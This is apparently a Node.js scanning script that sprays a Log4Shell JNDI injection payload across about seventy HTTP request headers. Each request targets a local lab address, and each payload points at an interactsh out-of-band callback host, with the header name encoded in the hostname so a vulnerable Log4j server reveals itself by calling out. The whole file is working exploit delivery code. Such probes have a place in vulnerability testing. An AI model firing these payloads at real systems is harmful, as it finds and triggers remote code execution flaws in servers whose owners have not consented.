import got from "got";
import { HttpsProxyAgent } from "hpagent";

const agentConfig = new HttpsProxyAgent({
  keepAlive: true,
  keepAliveMsecs: 1000,
  maxSockets: 256,
  maxFreeSockets: 256,
  scheduling: "lifo",
  //proxy: "http://192.168.0.150:8080",
});

const headersList = ["Referer","X-Api-Version","Accept-Charset","Accept-Datetime","Accept-Encoding","Accept-Language","Cookie","Forwarded","Forwarded-For","Forwarded-For-Ip","Forwarded-Proto","From","TE","True-Client-IP","Upgrade","User-Agent","Via","Warning","X-Api-Version","Max-Forwards","Origin","Pragma","DNT","Cache-Control","X-Att-Deviceid","X-ATT-DeviceId","X-Correlation-ID","X-Csrf-Token","X-CSRFToken","X-Do-Not-Track","X-Foo","X-Foo-Bar","X-Forwarded","X-Forwarded-By","X-Forwarded-For","X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Port","X-Forwarded-Proto","X-Forwarded-Protocol","X-Forwarded-Scheme","X-Forwarded-Server","X-Forwarded-Ssl","X-Forwarder-For","X-Forward-For","X-Forward-Proto","X-Frame-Options","X-From","X-Geoip-Country","X-Http-Destinationurl","X-Http-Host-Override","X-Http-Method","X-Http-Method-Override","X-HTTP-Method-Override","X-Http-Path-Override","X-Https","X-Htx-Agent","X-Hub-Signature","X-If-Unmodified-Since","X-Imbo-Test-Config","X-Insight","X-Ip","X-Ip-Trail","X-ProxyUser-Ip","X-Requested-With","X-Request-ID","X-UIDH","X-Wap-Profile","X-XSRF-TOKEN"]

for (let header of headersList) {
  console.log("sending request for: " + header);
  let payload = "${jndi:ldap://"+header+".c6vpp912vtc0000sxws0gdp5mfryyyyyb.interactsh.com/0ey0jqu}"
  let h = {[header]: payload}
  await sendRequest("http://192.168.0.128:8080/", h);
};

async function sendRequest(url, myheaders){
  try {
    let response = await got.get(url, {
      timeout: {
        request: 15,
      },
      //responseType: "json",
      headers: myheaders,
      https: { rejectUnauthorized: false },
      agent: { https: agentConfig },
      retry: { limit: 3, methods: ["GET", "POST"] },
    });
  
    //if (response.statusCode == 200) {
    //  return response.body;
    //}
    console.log("response.body: " + JSON.stringify(response.body))
  } catch (err) {
    console.log("[-] error: " + err);
  }
}
